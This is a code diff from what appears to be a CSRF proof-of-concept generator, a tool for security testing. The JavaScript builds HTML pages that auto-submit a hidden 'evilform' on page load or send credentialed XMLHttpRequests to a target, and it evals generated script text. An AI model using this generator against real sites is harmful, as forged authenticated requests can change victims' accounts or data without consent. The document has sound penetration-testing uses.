@@ -5,13 +5,19 @@ var formfunc = /** @class */ (function () {
         return false;
     };
     formfunc.prototype.generateHTML = function (title, bodyhtml) {
-        return "";
+        var content = getHTMLheader(title) + "\n<body" + ((isAutoSubmit()) ? ' onload="csrfSubmit();' : '') + ">\n" + bodyhtml + ((!isAutoSubmit()) ? '<button onclick="csrfSubmit();">submit</button>' : '') + "\n" + this.generateSendFunction() + "\n<p>" + title + "</p>\n" + getHTMLfooter() + "\n";
+        return content;
     };
     formfunc.prototype.send = function () {
-        return false;
+        var req = getRequest();
+        document.getElementById("stat").innerHTML += "<p>Request sent.</p><p>" + escapeHTML(req['url']) + "</p><p>" + escapeHTML(req['params']) + "</p><hr />";
+        var submit = HTMLFormElement.prototype["submit"].bind(document.evilform);
+        submit();
+        return true;
     };
-    formfunc.prototype.sendFunc = function () {
-        return false;
+    formfunc.prototype.generateSendFunction = function () {
+        var content = "<script>\nfunction csrfSubmit(){\n    let submit = HTMLFormElement.prototype[\"submit\"].bind(document.evilform);\n    submit();\n}\n</script>\n";
+        return content;
     };
     return formfunc;
 }());
@@ -34,36 +40,47 @@ var forfunc = {
         return true;
     },
     generateHTML: function (title, bodyhtml) {
-        var content = getHTMLheader(title) + "\n<body" + ((isAutoSubmit()) ? ' onload="csrfSubmit();' : '') + ">\n" + bodyhtml + ((!isAutoSubmit()) ? '<button onclick="csrfSubmit();">submit</button>' : '') + "\n" + this.sendFunction() + "\n<p>" + title + "</p>\n" + getHTMLfooter() + "\n";
+    },
+    send: function () {
+    },
+};
+var xhrfunc = {
+    generate: function () {
+        var req = getRequest();
+        if (req === false)
+            return false;
+        var ezhtml = "";
+        ezhtml += "function csrfSubmit(){\n";
+        ezhtml += "let xhr=new XMLHttpRequest();\n";
+        ezhtml += "xhr.open('" + req['method'] + "','" + req['url'] + "');\n";
+        ezhtml += "xhr.withCredentials = true;\n";
+        ezhtml += "xhr.setRequestHeader('Content-Type','" + req['enctype'] + "'";
+        if (req['enctype'] === "multipart/form-data")
+            ezhtml += "+'; boundary=" + req['boundary'] + "'";
+        ezhtml += ");\n";
+        ezhtml += "xhr.send('" + escapeJavascript(getParamsRaw()) + "');\n";
+        ezhtml += "}\n";
+        setEvilTextContent(ezhtml, true);
+        setEvilHTMLcontent(ezhtml);
+        return true;
+    },
+    generateHTML: function (title, bodyhtml) {
         var content = getHTMLheader(title);
         content += '<body';
         if (isAutoSubmit())
             content += ' onload="csrfSubmit();"';
         content += '>\n';
         content += bodyhtml;
-        if (!isAutoSubmit()) {
+        if (!isAutoSubmit())
             content += '<button onclick="csrfSubmit();">submit</button>\n';
-        }
-        content += formfunc.sendFunction();
         content += '\n<p>' + title + '</p>\n';
         content += '</body>\n';
         content += getHTMLfooter();
         return content;
     },
     send: function () {
-        var req = getRequest();
-        document.getElementById("stat").innerHTML += "<p>Request sent.</p><p>" + escapeHTML(req['url']) + "</p><p>" + escapeHTML(req['params']) + "</p><hr />";
-        var submit = HTMLFormElement.prototype["submit"].bind(document.evilform);
-        submit();
-    },
-    sendFunction: function () {
-        var content = '<sc' + 'ript>\n';
-        content += 'function csrfSubmit(){\n';
-        content += 'let submit = HTMLFormElement.prototype["submit"].bind(document.evilform);\n';
-        content += 'submit();\n';
-        content += '}\n';
-        content += '</sc' + 'ript>\n';
-        return content;
+        eval(document.getElementById("evilzone").textContent);
+        csrfSubmit();
     }
 };
 function getHTMLheader(title) {
